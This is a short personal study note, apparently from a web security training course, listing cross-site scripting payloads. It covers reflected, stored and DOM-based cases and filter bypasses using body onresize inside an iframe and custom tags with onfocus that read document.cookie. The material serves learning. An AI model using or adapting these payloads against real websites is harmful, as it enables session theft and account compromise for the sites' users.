# basic attack

#apprentice 
#### reflected
in [[cause & sinks#reflected|this]] case: 
> https://insecure-website.com/search?term=`<script>alert(1)</script>`
#### stored
in [[cause & sinks#stored|this]] case:
> comment=`<script>alert(1)</script>`
#### DOM-based
in [[cause & sinks#DOM-based|this]] case
> `"><svg onload=alert(1)>`

# contexts
## between HTML tags
##### most tags and attributes blocked
`<>` -> `<§§>` -> body tag accepted ->`<body%20§§=1>` -> `onresize` accepted -> `<iframe src="https://vulnerable-website.com/?search="><body onresize=print()>" onload=this.style.width='100px'>`
##### all tags and attributes blocked except custom ones
`<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x'`